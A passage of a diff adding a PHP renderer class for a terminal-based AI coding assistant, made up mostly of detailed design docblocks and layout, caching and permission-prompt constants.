@@ -1,0 +1,7288 @@
+<?php
+
+declare(strict_types=1);
+
+namespace SugarCraft\Code;
+
+use SugarCraft\Core\MouseMode;
+use SugarCraft\Core\SgrState;
+use SugarCraft\Core\Util\Color;
+use SugarCraft\Core\Util\Parser;
+use SugarCraft\Core\Util\Sanitize;
+use SugarCraft\Core\Util\Token;
+use SugarCraft\Code\Config\StatusLineCommand;
+use SugarCraft\Code\Media\PreviewPaint;
+use SugarCraft\Code\Media\PreviewSlots;
+use SugarCraft\Core\Util\Width;
+use SugarCraft\Core\View;
+use SugarCraft\Image\ImageLayer;
+use SugarCraft\Image\ImageSource;
+use SugarCraft\Image\Mosaic;
+use SugarCraft\Mouse\Mark;
+use SugarCraft\Mouse\Scanner;
+use SugarCraft\Mouse\Sentinel;
+use SugarCraft\Fuzzy\Highlighter;
+use SugarCraft\Fuzzy\MatchResult;
+use SugarCraft\Markdown\Render\SectionStream;
+use SugarCraft\Markdown\Renderer as Markdown;
+use SugarCraft\Style\Border;
+use SugarCraft\Style\Style;
+use SugarCraft\Overlay\Position;
+use SugarCraft\Overlay\Veil;
+use SugarCraft\Code\Agents\AgentManager;
+use SugarCraft\Code\Commands\KeyBindingRegistry;
+use SugarCraft\Code\Permissions\PermissionPromptStage;
+use SugarCraft\Code\Skills\SkillMentions;
+use SugarCraft\Code\Tui\AgentStatusBar;
+use SugarCraft\Code\Tui\AgentViewPane;
+use SugarCraft\Code\Tui\DiffGutter;
+use SugarCraft\Code\Tui\Pane;
+use SugarCraft\Code\Tui\SessionPicker;
+use SugarCraft\Code\Tui\Components\AgentDashboardPane;
+use SugarCraft\Code\Util\TokenCount;
+use SugarCraft\Code\Tui\Components\PaneLabel;
+
+/**
+ * Pure view function for {@see Chat} — the renderer that actually paints
+ * the transcript a real user running `bin/candy-code` sees.
+ *
+ * It is reached two ways, and both are live: `Chat::view()` calls
+ * {@see self::render()} for a Chat driven standalone, and the pane shell
+ * `bin/candy-code` runs today ({@see \SugarCraft\Code\Cli\Bootstrap::app()}
+ * -> {@see \SugarCraft\Code\App\App::view()} ->
+ * {@see \SugarCraft\Code\Tui\Renderer::renderView()}) delegates its chat
+ * pane's BODY back to this class against the hosted `Chat`. So
+ * `src/Tui/Renderer.php` is the surrounding chrome/compositor rather than a
+ * rival transcript renderer — the "second, parallel renderer nothing ever
+ * constructs" this docblock used to describe was merged onto, not deleted.
+ * This class still holds no reference to it (see the "R20 wiring decision"
+ * note below); the dependency runs one way only.
+ *
+ * Lays out the conversation scrollback (with each turn rendered through
+ * SugarMarkdown) above a fixed input area at the bottom, plus — when the
+ * matching {@see Chat} state is present — a session tab strip and an agent
+ * status/view section.
+ *
+ * Rendered shape:
+ *
+ *   session-a | [session-b] | session-c        ← only when ≥2 sessions exist
+ *   ┌─ CandyCode ───────────────────────┐
+ *   │ user> hello                        │
+ *   │ assistant: ## Hi there!             │
+ *   │            paragraph of markdown    │
+ *   │ user> question                     │
+ *   │ assistant: …                        │
+ *   ├─────────────────────────────────────┤
+ *   │ > █                                 │   ← input area
+ *   └─────────────────────────────────────┘
+ *   Enter to send · Esc / ^C to quit
+ *   ● reviewer [working] Reviews code…  0s  0 tok | $0.0000   ← only when
+ *   ┌─ agents ────────────────────────────┐                     Chat has an
+ *   │ ● reviewer [working]  Reviews code… │                     AgentManager
+ *   └──────────────────────────────────────┘                    with active agents
+ *
+ * The SugarMarkdown renderer is constructed once per call (cheap;
+ * just holds a theme reference). Only the assistant's Markdown gets
+ * rendered through SugarMarkdown; the raw user/system turns and the
+ * in-progress input are run through {@see Sanitize::untrustedForDisplay()}
+ * (escape/control strip plus CR → LF) first (see the render methods and
+ * {@see untrusted()} for why).
+ *
+ * ## R20 wiring decision (agent status/view + session tabs)
+ *
+ * {@see \SugarCraft\Code\Tui\AgentStatusBar} and
+ * {@see \SugarCraft\Code\Tui\AgentViewPane} already accept plain
+ * `list<AgentDisplayState>` + primitives as their render() arguments, NOT
+ * an `App` — so option (a) from the R20 brief ("adapt the components to
+ * accept the specific Chat-derived data they actually need") was already
+ * true for them with zero changes to those two classes. That made it the
+ * smaller move versus option (b) (building a throwaway `App::new(...)`
+ * adapter here): `App::new()` requires a real `ProviderInterface`, which
+ * `Chat` does not hold (it holds the unrelated `Backend` interface), so
+ * satisfying that constructor here would mean fabricating a fake provider
+ * purely to appease a type signature we don't otherwise need. This class
+ * takes its rows straight from the Chat's manager instead, through
+ * {@see \SugarCraft\Code\Tui\Components\AgentDashboardPane::managerEntries()}
+ * — one row per run, the same rows the Agents pane lists.
+ *
+ * ### R20.fix, CLOSED: `agentManager` IS populated in production
+ *
+ * The rendering below is only reachable when `Chat::agentManager()` is
+ * non-null, and until crush_code.md Phase 1 item 1 it never was:
+ * `SugarCraft\Code\Cli\Bootstrap::chat()` — the construction path
+ * `bin/candy-code` actually runs — passed no `agentManager:` argument, so
+ * `renderAgentView()` returned `''` for every real user regardless of
+ * config, and the path was exercised only by tests constructing
+ * `new Chat(agentManager: ...)` directly. That item added
+ * `Bootstrap::agentManager()` (built from `Bootstrap::provider()` +
+ * `Bootstrap::skillRegistry()`, the two collaborators this note used to
+ * record as unavailable) and passes it in, so the strip below is now
+ * REACHABLE — which is not the same as populated.
+ *
+ * ⚠️ THE REST OF THIS PARAGRAPH USED TO SAY `WorkflowEngine` IS NEVER
+ * CONSTRUCTED AND THAT `Chat::executeAgents()` IS THE ONE PRODUCTION ROUTE
+ * INTO `AgentManager::executeAll()`. BOTH WERE TRUE WHEN WRITTEN AND BOTH ARE
+ * NOW FALSE. crush_code.md Phase 2 item 3 landed
+ * `Bootstrap::workflowEngine()` and `Bootstrap::agentManager()`, wired side by
+ * side into `Bootstrap::chat()`'s `new Chat(` as the `workflowEngine:` and
+ * `agentManager:` arguments; `Chat::__construct()` links the two; and
+ * `WorkflowEngine::executeParallelStage()` calls `AgentManager::executeAll()`,
+ * which files every `SubAgent` under the manager's SUB-AGENT map and streams
+ * onto its `output`.
+ *
+ * ⚠️ AND THAT STILL DOES NOT POPULATE THIS STRIP — a first correction of this
+ * paragraph claimed it did, and the claim was measured false.
+ * `renderAgentView()` below reads `AgentManager::active()`, which iterates the
+ * REGISTERED map (`AgentManager::$agents`, written only by `register()`).
+ * `executeParallelStage()` never registers: it builds ad-hoc `Agent`s named
+ * `$task->name ?? $task->agentType` in `executeParallelStage()` and passes the
+ * `SubAgent`s straight to `executeAll()`. Neither shipped workflow names a
+ * parallel task after a roster agent — `examples/workflows/lint-then-fix.yaml`
+ * names `style-fixer`/`correctness-fixer`, `workflows/deep-research.php` names
+ * `docs-explorer`/`code-analyzer`/`pitfalls-researcher`/`integration-researcher`,
+ * and `Bootstrap::agentRoster()` ships coder/reviewer/debugger/architect/
+ * tester/devops — so `active()` cannot see one, and a `/workflow run` leaves
+ * this strip exactly as blank as it was.
+ *
+ * The shell's split-pane compositor solved its half of this by reading
+ * `liveOutputs()`, which now derives from the sub-agent map instead; THIS
+ * strip has not been changed to match, and doing so is its own decision
+ * (`active()` is a registration accessor that four other call sites share).
+ *
+ * The second half of the reason this strip stayed blank — that no frame
+ * painted during a run at all — is GONE. `Chat::workflowRun()` no longer calls
+ * `WorkflowEngine::run()` synchronously from inside `update()`: it hands the
+ * run to a `\Fiber` that a periodic timer on the ReactPHP loop steps, and
+ * `AgentWorkerPool::pumpProgress()` mirrors each running sub-agent's partial
+ * output onto it, so the compositor paints while the workflow is still going.
+ * See `Chat::workflowRun()` and `Chat::driveWorkflowFiber()`.
+ *
+ * ⚠️ Three docblocks (this one, `Tui\Renderer::agentSplitWidth()`, and
+ * `Chat::workflowRun()` itself) used to record that gap as "KNOWN GAP issue
+ * #79", citing `Chat.php:6212` dispatched at `:5480`. Every part of that was
+ * stale: the call sites had drifted to `:6478`/`:6390`, and detain/sugarcraft
+ * #79 is a MERGED pull request titled "Phase 9+: CandyMetrics — telemetry // @rename-keep historical PR-title citation
+ * primitives + SugarSshServer middleware" that has nothing to do with any of this.
+ * No open issue ever tracked it. Cited here so the next reader does not go
+ * looking for #79 again.
+ *
+ * The OTHER route opened with E675: `Tools\BuiltIn\TaskTool`
+ * (crush_code.md P8.13) is the model-turn delegation path —
+ * `Bootstrap::chat()` binds the session's one `AgentManager` into the tool
+ * feed, a `Task` call dispatches a roster agent through
+ * `AgentManager::executeAll()`, and that reaches `createSubAgent()` for the
+ * batch member. What still has no `src/` caller is `executeSubAgent()`'s
+ * in-process streaming path — the tool rides the pool path, not it — so the
+ * old sentence "there is no Task/Agent tool; delegation from a model turn
+ * remains unavailable" (crush_code.md #45) is false on its first half and
+ * true only on the in-process pair.
+ *
+ * What that does NOT mean is a permanent agent strip on every launch:
+ * `Bootstrap::agentRoster()` registers its agents INACTIVE, and
+ * `AgentManager::active()` promotes one only while it has a live sub-agent.
+ * A session where nothing has been delegated still renders `''` here — the
+ * same blank frame as before, now for the right reason; with the Task feed
+ * live, a blank frame means "nothing delegated yet", no longer "delegation
+ * is impossible". `handleAgentsCommand()`
+ * keeps its "not configured" degradation for embedders that construct a
+ * `Chat` without a manager.
+ *
+ * `elapsedSeconds`/`tokensUsed`/`costUsd` have been real per-agent telemetry
+ * since W3.S5b (see {@see \SugarCraft\Code\Tui\Components\AgentDashboardPane::managerEntries()}), and Phase 1 item 1 added the
+ * missing fourth: `AgentManager::liveOutput()`/`liveOutputs()`, the public
+ * "current live output buffer" accessor this note used to say had to exist
+ * before {@see \SugarCraft\Code\Tui\AgentOutputPane} or the P5.S7/S8
+ * split-pane renderer (`self::renderWithSplit()`/`renderForCurrentEnvironment()`
+ * on `Tui\Renderer`, meant for laying out *multiple* agents' live output side
+ * by side) could be wired to anything but empty tiles.
+ * {@see \SugarCraft\Code\Tui\Components\AgentDashboardPane} consumes it
+ * already, and crush_code.md Phase 8 item 4 has since answered the layout
+ * question the rest of this paragraph was waiting on: the compositor is WIRED,
+ * and it does NOT replace this strip.
+ *
+ * {@see \SugarCraft\Code\Tui\Renderer::renderView()} splits its content band
+ * whenever `liveOutputs()` is non-empty and the terminal is at least 80
+ * columns, putting a {@see \SugarCraft\Code\Tui\Components\AgentSplitColumn}
+ * of per-agent tiles to the RIGHT of the shell band — so the split is a
+ * property of the SHELL frame, one nesting level above this class. What
+ * `render()` draws here is the in-transcript single-column strip, unchanged.
+ * The two are not redundant: this one is a line in the transcript, the
+ * compositor's is a column beside it, and a session that has no `App` shell
+ * around it — or a terminal under 80 columns — still gets this one and only
+ * this one. Their VISIBILITY during a workflow now differs, and this is the
+ * line that used to get it wrong — it still said "neither is visible … for
+ * the issue-#79 reason above" fifty lines BELOW the paragraph that records
+ * that reason as gone. The compositor's column DOES paint during a run
+ * (fiber-driven frames plus `pumpProgress()`, per that paragraph); this
+ * in-transcript strip still does not, for the entirely separate reason at the
+ * top of this block — it reads `active()`, the REGISTERED map, and a
+ * workflow's parallel agents are never registered. The compositor's docblock
+ * ({@see \SugarCraft\Code\Tui\Renderer::agentSplitWidth()}) carries the
+ * measurement.
+ * `src/Tui/Components/AgentsPane.php` — also in R20's file list
+ * — is untouched by THIS class for a different reason than the one recorded
+ * here originally. The `App`-keyed pane system it belongs to is no longer
+ * disconnected (see the opening paragraph), but that does NOT mean the shell
+ * paints `AgentsPane`: {@see \SugarCraft\Code\Tui\Renderer::renderView()}
+ * diverts a FOCUSED `Pane::Agents` to the full-width
+ * {@see \SugarCraft\Code\Tui\Components\AgentDashboardPane} before any
+ * sidebar is built, so on a focused-Agents frame the dashboard is still the
+ * only agents surface in play. Docking phase 2 took the seam off death row,
+ * though: the sidebar composition ({@see \SugarCraft\Code\Tui\Renderer::renderSide()})
+ * paints `AgentsPane` for an Agents slot in the dock while any other pane
+ * holds focus — the side-by-side re-entry the seam was preserved for.
+ * `Tui\Renderer::rightSidebar()`'s own docblock
+ * records the same thing from the other side; the two are meant to agree.
+ *
+ * Do not "confirm" the opposite by eye: `AgentDashboardPane` delegates to
+ * {@see \SugarCraft\Code\Tui\AgentViewPane}, which draws an identically
+ * worded `' agents '` border title and `(no active agents)` empty state. On
+ * a 120-column terminal the box actually in the frame is 120 wide and the
+ * 34-column `AgentsPane` block appears nowhere in it — width, not wording,
+ * is what tells the two apart.
+ *
+ * `Tui\SessionTabs` is not instantiated here either: its constructor always
+ * seeds one synthetic "main" tab when started empty, a shape built for a
+ * fresh single-session boot rather than for hydrating N pre-existing rows
+ * from a `SessionStore`. Retrofitting that would mean changing
+ * `SessionTabs.php` itself (not in this item's file scope) or fabricating
+ * and discarding a placeholder tab. Its real, tested key surface
+ * (`CTRL_TAB`/`CTRL_SHIFT_TAB`, `cycleForward()`/`cycleBackward()`'s
+ * wraparound semantics) is instead the design this renderer's tab strip and
+ * {@see Chat}'s Ctrl+Tab handling both follow directly against
+ * `SessionStore::listSessions()`'s real, persisted row order — see
+ * `Chat::cycleSessionTab()`'s docblock for the matching switching half.
+ *
+ * ### Session rows are created in production (was: "no production code path
+ * ever calls `createSession()`")
+ *
+ * `renderSessionTabStrip()` reads real rows from
+ * {@see \SugarCraft\Code\Session\SessionStore::listSessions()}, and since
+ * 737da6413 (W3.S1) those rows exist on a real run:
+ * `Cli\Bootstrap::seedSession()` resumes the most recent session or creates
+ * one before `Bootstrap::chat()` constructs the Chat, and the Ctrl+P
+ * palette's "New session" (`Chat::handlePaletteNewSession()`, which really
+ * does call `createSession()`) and `/branch` add more. The note that used
+ * to sit here — claiming nothing in `src/` or `bin/` ever called
+ * `createSession()`, so `listSessions()` returned `[]` for the whole
+ * process lifetime — was written four days before that commit and is simply
+ * no longer true.
+ *
+ * `count($rows) < 2` still suppresses the strip, and that is the intended
+ * shape rather than the leftover of the old gap: a boot seeds ONE row, and
+ * a single-session strip would be chrome that never changes. The strip
+ * appears the moment a second session exists — the same threshold
+ * {@see Chat::cycleSessionTab()} switches at, so the strip and the Ctrl+Tab
+ * binding that moves through it become useful together.
+ */
+final class Renderer
+{
+    /** Maximum rows AgentViewPane renders before clipping (see AgentViewPane::render()). */
+    private const AGENT_VIEW_MAX_ROWS = 10;
+
+    /**
+     * Maximum diff rows {@see renderDiff()} paints before it clips and prints
+     * an "N more lines" trailer. A single Edit can rewrite hundreds of lines;
+     * without a cap the diff alone would fill the viewport and evict the whole
+     * transcript once {@see render()}'s tail-clipping runs.
+     *
+     * The DEFAULT of the `diffPreviewRows` setting (roadmap N-P4g);
+     * {@see renderDiff()} reads {@see diffPreviewRows()}.
+     */
+    public const DIFF_MAX_ROWS = 24;
+
+    /** The diff rows painted before the trailer: `diffPreviewRows` (N-P4g). */
+    private static function diffPreviewRows(): int
+    {
+        return \SugarCraft\Code\Config\Settings\UiSettings::int('diffPreviewRows');
+    }
+
+    /**
+     * Columns of diff text {@see renderDiff()} insists on keeping before it
+     * will spend any on {@see DiffGutter}'s line numbers. Below this the gutter
+     * would be eating a third of a narrow viewport to annotate rows that have
+     * been truncated back to their `+`/`-` marker.
+     */
+    private const DIFF_MIN_BODY_COLS = 24;
+
+    /**
+     * Columns the transcript shell's own chrome consumes, subtracted before
+     * anything inside it is truncated to width.
+     *
+     * ZERO since CL-3: the shell's rounded border + `padding(1, 2)` (6 cols,
+     * 4 rows) was removed because the hosted App paints its own ChatPane box
+     * around this frame — the double chat frame. The transcript now paints
+     * bare. The const is KEPT (at 0) rather than deleted because every
+     * consumer below reads its derivation through it — content width, the
+     * picker overlays, the slash menu, the permission modal, the selection
+     * inset — and `Commands\TranscriptTable::CHROME_COLS` is reflection-pinned
+     * equal to it; if a frame ever comes back, the number returns HERE.
+     *
+     * PUBLIC since E744 WS4: {@see \SugarCraft\Code\Tui\SessionPicker::overlayGeometry()}
+     * and {@see Chat}'s picker-zone whitelist must size the overlay with the
+     * same number {@see renderSessionPicker()} paints it with, and a second
+     * literal would be a drift waiting to happen.
+     */
+    public const SHELL_CHROME_COLS = 0;
+
+    /**
+     * Columns the "/" popup's own frame costs on top of
+     * {@see SHELL_CHROME_COLS}: `border()` is 1 each side and `padding(0, 1)`
+     * is another 1 each side. Named because the row budget in
+     * {@see renderSlashMenu()} has to subtract it and a boundary spelled twice
+     * is a boundary that drifts.
+     */
+    private const SLASH_MENU_CHROME_COLS = 4;
+
+    /**
+     * Terminal widths below which {@see renderSlashMenu()}'s narrowest painted
+     * row cannot fit: its own chrome ({@see SLASH_MENU_CHROME_COLS}), the two
+     * columns every row spends on its "▸ "/"  " marker, and one content cell.
+     * Owned by the frame's clip decision in {@see renderView()} — see the
+     * comment there for why this, not the removed shell's chrome, is what the
+     * clip triggers on.
+     */
+    private const SLASH_MENU_MIN_COLS = 7;
+
+    /**
+     * Chrome {@see renderInput()}'s box spends on itself: `border()` is 1 cell
+     * each side and `padding(0, 1)` is another 1 each side.
+     *
+     * NOT {@see SHELL_CHROME_COLS} — which CL-3 zeroed when the transcript
+     * shell's border went (it had been the same arithmetic for the shell's
+     * wider `padding(1, 2)`). The input box kept its frame. Named because the
+     * draft's wrap budget subtracts it and a boundary spelled twice is a
+     * boundary that drifts.
+     */
+    private const INPUT_CHROME_COLS = 4;
+
+    /**
+     * Cells the `"> "` prompt (and the matching continuation indent) takes out
+     * of {@see renderInput()}'s per-row text budget.
+     */
+    private const INPUT_PROMPT_COLS = 2;
+
+    /**
+     * Fixed head of a finished tool row, ahead of the model-chosen tool name.
+     * Named because {@see renderToolResults()} subtracts its width from the row
+     * budget and a boundary spelled twice is a boundary that drifts. The word
+     * is translated, so the head is built per call and measured by width.
+     */
+    public static function toolRowPrefix(): string
+    {
+        return '🔧 ' . Lang::t('tui.tool.row_label') . ' ';
+    }
+
+    /**
+     * The head prefix of a Skill tool row — `✨ skill: <name>` instead of the
+     * generic `🔧 tool: Skill`, so the collapsed transcript says WHICH skill
+     * loaded (lane B, skills-qa F1). Pairs with {@see toolRowPrefix()}: same
+     * shape, same verbatim-prefix law for the click zones.
+     */
+    public static function skillRowPrefix(): string
+    {
+        return '✨ ' . Lang::t('tui.skills.row_label') . ' ';
+    }
+
+    /** Below this many columns an argument hint is dropped, not truncated. */
+    private const SLASH_MENU_MIN_HINT_COLS = 4;
+
+    /**
+     * How many times {@see wrapToPane()} may re-ask {@see Width::wrapAnsi()} for
+     * a narrower wrap before it gives up and cuts.
+     *
+     * Only ever reached by a row whose grapheme clusters the wrap and the
+     * measure disagree about (see {@see wrapToPane()}); the observed cases —
+     * regional-indicator flags and skin-tone modifiers, a constant factor of two
+     * — converge in four. 8 is that with room, and it is a cap on WORK rather
+     * than on correctness: the cut backstop holds the bound either way.
+     */
+    private const WRAP_RETRY_MAX = 8;
+
+    /**
+     * Narrowest tail {@see toolCallSuffix()} will draw. Below this the row is
+     * left as-is: four columns of an elided command tells the user nothing
+     * and only costs the status marker its breathing room.
+     */
+    private const TOOL_DESCRIPTION_MIN_COLS = 8;
+
+    /**
+     * Cell width a tool-result image ({@see renderToolImage()}) is scaled to
+     * before its height is derived from the source aspect ratio. Literally
+     * crush_feat.md §9 E3's `$w = 40`: wide enough for a screenshot to be
+     * legible, narrow enough that it still fits inside the chat shell on an
+     * 80-column terminal without pushing the transcript off-screen.
+     */
+    private const IMAGE_COLS = 40;
+
+    /**
+     * Distinct encoded pictures {@see $imageCache} keeps before it starts
+     * evicting the least recently used one. A handful is enough to cover every
+     * image still on screen (the transcript is tail-clipped to one viewport)
+     * while keeping the retained blob bytes bounded in a session that scrolls
+     * hundreds of screenshots past.
+     */
+    private const IMAGE_CACHE_MAX = 8;
+
+    /**
+     * Encoded pictures, keyed by source bytes + cell box + protocol, in
+     * least-recently-used-first order.
+     *
+     * `Program::renderFrame()` calls `Chat::view()` on EVERY dirty frame - each
+     * keystroke, each streaming chunk, each spinner tick - so without this an
+     * image-bearing tool result would re-decode its bytes through ext-gd and
+     * re-encode the picture on every one of those frames, for every image still
+     * in the transcript. That is single-digit milliseconds for half-block but
+     * hundreds of milliseconds for Sixel, i.e. exactly the pixel-graphics
+     * protocols this feature exists to enable would be the ones that make the
+     * TUI unusable. The output is a pure function of the key, so memoizing it
+     * is safe.
+     *
+     * @var array<string, array{ok: bool, body: string}>
+     */
+    private static array $imageCache = [];
+
+    /**
+     * Distinct settled assistant bodies {@see $markdownMemo} keeps before it
+     * evicts the least recently used one.
+     *
+     * Unlike {@see IMAGE_CACHE_MAX}, this bound has to be larger than the
+     * number of assistant turns in a long session. The whole transcript is
+     * rendered on every frame, oldest turn first, so an LRU smaller than the
+     * transcript evicts each entry just before it is needed again and never
+     * hits. An entry is the rendered SGR text of one reply, a few KB, so
+     * 4096 of them is tens of MB at worst. A session with more turns than
+     * that is only as slow as it was before the memo.
+     */
+    private const MARKDOWN_MEMO_MAX = 4096;
+
+    /**
+     * Rendered SugarMarkdown bodies of settled assistant turns, keyed by wrap
+     * width and a hash of the source text, least recently used first
+     * (audit 15b-10).
+     *
+     * `Program::renderFrame()` repaints on every keystroke, token batch and
+     * tick, and {@see renderHistory()} used to re-parse every assistant reply
+     * on every one of those frames: 0.7 s per keystroke at 200 exchanges. A
+     * settled reply does not change, and its body is a pure function of
+     * (source, width, markdown theme): SugarMarkdown reads no clock, environment
+     * or terminal state while rendering, and one renderer instance renders a
+     * given source to the same bytes however many documents it rendered
+     * before. Everything with per-frame side effects (the thought row's
+     * click zone, tool rows, image markers) stays outside the memo.
+     *
+     * The theme is not in the key. The memo belongs to one markdown theme
+     * object, {@see $markdownMemoTheme}, and is emptied when a frame renders
+     * with a different one. A theme switch costs one cold frame. Keying on
+     * spl_object_id() instead would be unsafe, because PHP reuses the id of
+     * a freed object.
+     *
+     * @var array<string, string>
+     */
+    private static array $markdownMemo = [];
+
+    /** @var \WeakReference<\SugarCraft\Markdown\Theme>|null the theme {@see $markdownMemo} was filled with */
+    private static ?\WeakReference $markdownMemoTheme = null;
+
+    /**
+     * The streaming partial's incremental render state (audit 15b-10).
+     *
+     * A streaming reply only grows, and re-parsing all of it on every token
+     * batch cost 2.1 s per frame at 200 KB. SugarMarkdown's
+     * {@see SectionStream} splits Markdown at top-level boundaries the parser
+     * confirms, where rendering the pieces separately gives the same bytes as
+     * rendering the whole (the law {@see Markdown::stream()} is pinned to),
+     * and carries link reference definitions across them. Here the stream is
+     * kept alive between frames. Each frame feeds it only the bytes that
+     * arrived since the last one; the sections it answers are final and are
+     * appended to `bodies` once. What it has not answered yet (the open tail,
+     * and any section waiting for a definition) is rendered again each frame
+     * from a clone.
+     *
+     * Valid while `consumed` is a prefix of the new partial and the theme
+     * and width are unchanged. Any other partial (a new turn, a retry, a
+     * resize) starts a new state.
+     *
+     * The open tail's preview is kept with the state (`preview`): between
+     * token batches the 30 fps repaint ticks reach this method with the
+     * SAME partial (the spinner animates, the reply does not), and re-running
+     * the whole-tail `finish()` on unchanged bytes is pure waste - measured
+     * 34 ms per idle frame at a 32 KB open code fence, on top of a
+     * quadratically growing preview. An unchanged partial replays from the
+     * cache; a grown one recomputes it. (The growth frames themselves stay
+     * whole-tail renders on purpose: SugarMarkdown pads every fenced line to the
+     * block's widest line, so a later line REWRITES earlier rows' bytes and no
+     * incremental splice can be byte-identical - the append-stability probes
+     * behind cl-4 FIX-B. Making growth frames incremental is a SugarMarkdown
+     * seam, not a Renderer one.)
+     *
+     * @var array{theme: \WeakReference<\SugarCraft\Markdown\Theme>, width: int, consumed: string, stream: SectionStream, bodies: string, preview: array{src: string, out: string}|null}|null
+     */
+    private static ?array $streamMemo = null;
+
+    /**
+     * Distinct styled rows {@see $styleTokenMemo} keeps. Large for the same
+     * reason as {@see MARKDOWN_MEMO_MAX}: it has to hold every row of a long
+     * transcript, or the oldest rows are evicted just before the next frame
+     * reads them again.
+     */
+    private const STYLE_TOKEN_MEMO_MAX = 32768;
+
+    /**
+     * {@see styleTokens()}'s results, keyed by the row itself. Rows are already
+     * cut to the pane width when they get here, so the keys are short.
+     *
+     * @var array<string, array{0: list<Token>, 1: bool, 2: SgrState, 3: string}>
+     */
+    private static array $styleTokenMemo = [];
+
+    /** @var array{0: list<Token>, 1: bool, 2: SgrState, 3: string}|null {@see styleTokens()}'s answer for a row with no ESC */
+    private static ?array $plainRow = null;
+
+    private static ?SgrState $initialSgrState = null;
+
+    /**
+     * {@see hiddenBodyLineCount()}'s answers, keyed by body length and hash.
+     * Bounded by {@see MARKDOWN_MEMO_MAX}, since there is at most one entry
+     * per tool call in the transcript.
+     *
+     * @var array<string, int>
+     */
+    private static array $hiddenBodyMemo = [];
+
+    /**
+     * Inner width of the permission modal, in cells. Wider than the palette's
+     * 50 because a prompt body is prose (a hook's question plus the tool
+     * call's own arguments), not a list of short command labels.
+     */
+    private const PERMISSION_MODAL_COLS = 60;
+
+    /**
+     * Columns {@see renderPermissionPrompt()}'s own box spends on itself:
+     * `border()` 1 each side plus `padding(1, 2)` 2 each side = 6. Taken off
+     * the terminal width before the content width is chosen so the finished
+     * box never reaches the terminal over-wide (the overlay clip would cut its
+     * right border). Owned here, not by {@see SHELL_CHROME_COLS}, since CL-3
+     * removed the shell's frame — the two numbers merely used to coincide.
+     */
+    private const PERMISSION_MODAL_CHROME_COLS = 6;
+
+    /**
+     * Rows of the hook's question {@see renderPermissionPrompt()} paints
+     * before it clips. A hook is free to hand back an arbitrarily long
+     * message (it can quote the whole command it objected to); an unbounded
+     * modal would grow past the viewport and push its own answer keys
+     * off-screen, leaving the user blocked on a prompt whose options they
+     * cannot see.
+     */
+    private const PERMISSION_PROMPT_MAX_ROWS = 8;
+
+    /**
+     * Rows a `Bash` command may take in the permission modal before its
+     * middle is elided ({@see permissionCommandBlock()}), and how many of them
+     * are kept from its end.
+     */
+    private const PERMISSION_COMMAND_MAX_ROWS = 12;
+
+    private const PERMISSION_COMMAND_TAIL_ROWS = 3;
+
+    /** Lead of the permission modal's title row, before the tool name. */
+    private const PERMISSION_TITLE_ICON = '🔒 ';
+
+    /**
+     * The answer keys {@see renderPermissionPrompt()} advertises while the
+     * prompt is ARMED, as `[keys, label]` pairs.
+     *
+     * Deliberately a table rather than a formatted string literal: it has to
+     * stay in lockstep with `Chat::handlePermissionKey()`'s arms, and a list of
+     * the exact accepted keys is far easier to check against those arms than
+     * prose is. Only keys that DO something in this stage are listed - every
+     * other key disarms the prompt rather than answering it, so advertising it
+     * would promise an answer that never arrives.
+     *
+     * `a` names what it remembers (`always allow Bash(git status *)`) and
+     * answers at once; `e` edits that before it is remembered. Both rows are
+     * left out for a question nothing can remember, and `e` for a tool whose
+     * only scope is the tool itself. `p` is `a` written down — the same scope
+     * saved to `permissionRules` so it outlives the session — and is left out
+     * when no configured rule reproduces that scope
+     * ({@see \SugarCraft\Code\Chat::permissionPersistScope()}).
+     */
+    private const PERMISSION_OPTIONS = [
+        ['y', 'tui.permission.allow_once'],
+        ['a', 'tui.permission.always_scope'],
+        ['p', 'tui.permission.persist_scope'],
+        ['e', 'tui.permission.edit_scope'],
+        ['n / Esc', 'tui.permission.reject'],
+        ['r', 'tui.permission.reject_with_note'],
+        ['x', 'tui.permission.reject_and_stop'],
+    ];
+
+    /**
+     * The rejection note's own keys, shown while `r` has the user typing it
+     * ({@see \SugarCraft\Code\Permissions\PermissionPromptStage::WritingNote}).
+     * The note itself is typed into the draft box and painted above these.
+     */
+    private const PERMISSION_NOTE_OPTIONS = [
+        ['Enter', 'tui.permission.send_note'],
+        ['Esc', 'tui.permission.back_to_question'],
+    ];
+
+    /**
+     * The scope editor's own keys, shown while `e` has the user editing what
+     * `a` would remember
+     * ({@see \SugarCraft\Code\Permissions\PermissionPromptStage::EditingScope}).
+     * The scope itself is typed into the draft box and painted above these.
+     */
+    private const PERMISSION_SCOPE_OPTIONS = [
+        ['Enter', 'tui.permission.save_scope'],
+        ['Esc', 'tui.permission.scope_back'],
+    ];
+
+    /**
+     * What a DISARMED prompt advertises: the two keys that still do something,
+     * and by omission the fact that the answer letters do not.
+     *
+     * A prompt that silently ate keys would be a worse defect than the one the
+     * arm rule closes, so the state is on screen rather than only in the model
+     * ({@see PERMISSION_DISARMED_NOTICE} carries the "why nothing is
+     * happening" half).
+     */
+    private const PERMISSION_DISARMED_OPTIONS = [
+        ['Enter', 'tui.permission.rearm'],
+        ['Esc', 'tui.permission.reject_live'],
+    ];
+
+    /**
+     * The line that tells a user their keystrokes are going nowhere, painted
+     * above {@see PERMISSION_DISARMED_OPTIONS}.
+     *
+     * Public so a test can assert the cue by the same string the renderer
+     * paints instead of by a hand-copied literal that can drift out from under
+     * it - the treatment {@see KEY_HELP_OVER_PROMPT} already gets.
+     */
+    public const PERMISSION_DISARMED_NOTICE = 'tui.permission.disarmed';
+
+    /**
+     * Rows/characters {@see collapseToolOutput()} keeps of a tool body before
+     * it clips and prints an overflow trailer (crush_feat.md §1 E5). Both
+     * limits matter independently: a `Grep` result can be 400 short lines
+     * (blows the line budget) and a `Bash` result can be one 200KB line
+     * (blows the character budget while still being "1 line").
+     *
+     * The line limit is the DEFAULT of the `toolOutputPreviewLines`
+     * setting (roadmap N-P4g), read through {@see toolOutputPreviewLines()}.
+     */
+    public const TOOL_OUTPUT_MAX_LINES = 10;
+
+    /** Collapsed tool-output lines: `toolOutputPreviewLines` (N-P4g). */
+    private static function toolOutputPreviewLines(): int
+    {
+        return \SugarCraft\Code\Config\Settings\UiSettings::int('toolOutputPreviewLines');
+    }
+
+    /**
+     * Whether a settled tool call's output is shown in full until the user
+     * collapses it: the `expandToolOutput` setting (roadmap N-P4g, default
+     * off — hide-on-success, crush_feat.md §1 E5). {@see Chat::expanded()}
+     * then records only the calls that differ from it, so a `false` entry is
+     * a call the user closed. Thoughts keep their own collapsed default.
+     */
+    public static function toolOutputExpandedByDefault(): bool
+    {
+        return \SugarCraft\Code\Config\Settings\UiSettings::bool('expandToolOutput');
+    }
+
+    private const TOOL_OUTPUT_MAX_CHARS = 2000;
+
